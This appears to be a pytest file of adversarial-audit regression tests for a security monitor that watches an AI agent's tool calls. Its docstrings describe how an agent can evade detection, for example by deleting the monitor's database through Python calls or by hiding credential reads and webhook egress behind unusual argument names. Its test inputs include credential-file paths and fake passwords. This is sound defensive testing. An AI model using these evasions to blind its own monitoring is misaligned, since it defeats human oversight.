"""Round-2 adversarial audit, kept as proof-of-failure tests (ids refer to audit/round2.md).

Convention is the same as round 1: each test asserts the *claimed* (correct) behaviour, so a
**failing test is a confirmed finding**. Tests whose name starts with ``test_held_`` assert things
that currently hold up and should pass.

Kept as regression tests after the round-2 fixes; all must pass.

Every credential-shaped literal is assembled from parts (as redact.py and round 1 do) so this file
adds no hits to Hermes's install scanner. None of the values are real.
"""

from __future__ import annotations

import importlib
import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from conftest import load_plugin_package  # noqa: E402

PLUG = load_plugin_package()
CORE = PLUG.__name__ + ".siemless_core"


def M(name):
    return importlib.import_module(f"{CORE}.{name}")


R, COL, OCSF = M("redact"), M("collectors"), M("ocsf")

# ----- assembled fake secrets (never real) ---------------------------------------------------
PW = "CANARY" + "PW" + "7654321x"
TOK = "CANARY" + "TOK" + "90123456"
SIEM_DB = "~/.hermes/plugin-data/siem" + "less/siem" + "less.db"
SIEM_DIR = "~/.hermes/plugin-data/siem" + "less"


@pytest.fixture
def fresh(tmp_path, monkeypatch):
    monkeypatch.setenv("HERMES_HOME", str(tmp_path / "home"))
    made = []

    def make(**over):
        d = tmp_path / f"p{len(made)}"
        d.mkdir()
        cfg = M("config").load(overrides={"finding_cooldown_s": 0, **over})
        p = M("pipeline").Pipeline(cfg, store=M("store").Store(d / "x.db"), data_dir=d, worker=False, profile="default")
        made.append(p)
        return p

    yield make
    for p in made:
        p.close()
        p.store.close()


def run(p, steps, sid="S1", tid="t1"):
    out = []
    for hook, pay in steps:
        _, f = p.process_now(hook, {"session_id": sid, "turn_id": tid, **pay})
        out += f
    return out


def rules(fs):
    return [(f["rule_id"], f["severity"]) for f in fs]


def tool(name, args, status="ok"):
    return ("post_tool_call", {"tool_name": name, "args": args, "status": status, "result": "ok", "duration_ms": 5})


def sh(cmd, tool_name="terminal"):
    return tool(tool_name, {"command": cmd})


# =============================================================================================
# Axis 1 — secret leakage: credential shapes the canary set does not cover reach store/exports
# =============================================================================================
def test_redis_cli_password_flag_redacted():
    """R2-L1: `redis-cli -a <password>` is an everyday credential on the command line."""
    cmd = f"redis-cli -a {PW} -h db.example.com ping"
    assert PW not in R.redact_text(cmd), R.redact_text(cmd)


def test_npmrc_authtoken_redacted():
    """R2-L1: the npm registry auth token (`//registry/:_authToken=`, `_auth=`, `_password=`) is
    the credential CI pipelines write most often. `_`-prefixed keys defeat the `\\b` in _KV_RE."""
    for line in (f"//registry.npmjs.org/:_auth" + f"Token={TOK}",
                 f"//registry.npmjs.org/:_auth={TOK}",
                 f"//registry.npmjs.org/:_password={PW}"):
        assert TOK not in R.redact_text(line) and PW not in R.redact_text(line), R.redact_text(line)


def test_netrc_password_word_redacted():
    """R2-L1: `.netrc` uses `password <value>` (space, no `=`/`:`). The redactor already *knows*
    .netrc is a credential store (sensitive.py), yet leaks its contents when they appear inline."""
    line = f"machine h.example.com login u password {PW}"
    assert PW not in R.redact_text(line), R.redact_text(line)


def test_cli_password_leak_does_not_reach_store_ocsf_cef():
    """R2-L1 end-to-end: the leaked password reaches the stored event body, OCSF process.cmd_line
    and the CEF commandLine field — i.e. siemless.db, events.jsonl and every remote exporter."""
    cmd = f"redis-cli -a {PW} -h db.example.com ping"
    evs = COL.collect("post_tool_call", {"tool_name": "terminal", "args": {"command": cmd},
                                         "status": "ok", "session_id": "s", "turn_id": "t"})
    exe = [e for e in evs if e.kind == "process.exec"]
    assert exe, "expected a process.exec event"
    e = exe[0]
    import json
    assert PW not in json.dumps(e.to_dict()), "leak in stored event body"
    assert PW not in OCSF.dumps(OCSF.to_ocsf(e)), "leak in OCSF rendering"
    assert PW not in OCSF.to_cef(e), "leak in CEF rendering"


# =============================================================================================
# Axis 2 — detection evasion
# =============================================================================================
def test_telemetry_delete_via_interpreter_is_detected(fresh):
    """R2-E1: an agent with execute_code can delete SIEMless's own database with os.remove /
    shutil.rmtree / os.rename. None carries a shell verb from the cmd:telemetry_tamper regex and
    none contains a _WRITE_HINT, so the detector that round 1 added is silent — the SIEM goes dark
    with no finding at all. (rm/pathlib-unlink/open-w ARE caught; these interpreter calls are not.)"""
    cases = {
        "os.remove": f"import os; os.remove(os.path.expanduser('{SIEM_DB}'))",
        "shutil.rmtree": f"import os, shutil; shutil.rmtree(os.path.expanduser('{SIEM_DIR}'))",
        "os.rename-aside": f"import os; os.rename(os.path.expanduser('{SIEM_DB}'), '/tmp/x')",
    }
    misses = {}
    for name, code in cases.items():
        fs = run(fresh(), [tool("execute_code", {"code": code})])
        if not fs:
            misses[name] = "no finding"
    assert not misses, f"telemetry tamper invisible for: {misses}"


def test_secret_read_via_other_tool_nonstandard_argname(fresh):
    """R2-E2: round 1's H-3 fix derives secret.access from an *other* tool only when the path sits
    under one of a fixed key set (path/file_path/...). An MCP or plugin tool that names its path
    `location`, `input`, `object` or `source_path` reads the credential store with no secret.access,
    so SL-001/003/014 never fire."""
    missed = []
    for argname in ("location", "input", "object", "source_path", "uri"):
        evs = COL.collect("post_tool_call", {"tool_name": "mcp_fs_read", "args": {argname: "/home/u/.aws/credentials"},
                                             "status": "ok", "session_id": "s", "turn_id": "t"})
        if "secret.access" not in [e.kind for e in evs]:
            missed.append(argname)
    assert not missed, f"secret read invisible through other-tool arg names: {missed}"


def test_egress_via_other_tool_nonstandard_argname(fresh):
    """R2-E2: likewise an egress tool whose destination arg is `endpoint`/`target_url`/`callback`
    produces no net.egress, so SL-012 (webhook) and SL-001's egress half are blind."""
    missed = []
    for argname in ("endpoint", "target_url", "callback"):
        evs = COL.collect("post_tool_call", {"tool_name": "mcp_http_post", "args": {argname: "https://webhook.site/abc", "body": "x"},
                                             "status": "ok", "session_id": "s", "turn_id": "t"})
        if "net.egress" not in [e.kind for e in evs]:
            missed.append(argname)
    assert not missed, f"egress invisible through other-tool arg names: {missed}"


def test_fp_env_read_then_owner_reply_not_high(fresh):
    """R2-FP1: reading a `.env` (routine dev work) and then sending ANY message to the session owner
    raises SL-001 *high* ("Sensitive access then egress to owner"). round 1's FP-1 recommended
    capping a send to the agent's own channel at medium; it was never implemented. _is_external_egress
    treats every send as external egress whatever the destination (baseline.py:43-44)."""
    fs = run(fresh(), [tool("read_file", {"path": "/repo/.env"}),
                       tool("send_message", {"platform": "cli", "to": "owner", "message": "deploy done"})])
    hot = [f for f in fs if f["rule_id"] == "SL-001" and f["severity"] in ("high", "critical")]
    assert not hot, f"owner reply after .env read over-fires: {[(f['rule_id'], f['severity'], f['title']) for f in fs]}"


# =============================================================================================
# What held up — these pass
# =============================================================================================
def test_held_pathlib_unlink_and_open_w_detected(fresh):
    """The shell-verb-free deletions that DO contain a _WRITE_HINT (`.unlink`, `open(`) are still
    caught as a config:siemless change (SL-010), confirming the gap above is specific to the
    interpreter calls that match no hint."""
    for code in (f"from pathlib import Path; Path(os.path.expanduser('{SIEM_DB}')).unlink()",
                 f"open(os.path.expanduser('{SIEM_DB}'), 'w').close()"):
        fs = run(fresh(), [tool("execute_code", {"code": code})])
        assert any(f["rule_id"] == "SL-010" for f in fs), code


def test_held_mysql_and_bearer_still_redacted():
    """The shapes round 1 added stay redacted."""
    assert PW not in R.redact_text(f"mysql -uroot -p{PW} db")
    assert TOK not in R.redact_text(f"curl -H 'Authorization: Bearer {TOK}' x")
    assert PW not in R.redact_text(f"sshpass -p {PW} ssh h")


def test_held_replay_is_labelled_and_not_remote(fresh):
    """Replayed events keep the replay tag through OCSF, so they are never mistaken for live, and a
    remote exporter would drop them (tag filter in dispatch._deliver)."""
    p = fresh()
    _, fs = p.process_now("post_tool_call", {"_replay": True, "tool_name": "read_file",
                                             "args": {"path": "/home/u/.ssh/id_rsa"}, "status": "ok",
                                             "session_id": "r1", "turn_id": "t1"})
    stored = p.store.events(limit=50)
    assert stored and all("replay" in (e.get("tags") or []) for e in stored if e["kind"] != "finding")
    e = M("events").Event(kind="secret.access", tags=["replay", "sensitive:ssh"], target="/x")
    assert OCSF.to_ocsf(e)["unmapped"]["siemless"].get("replay") is True
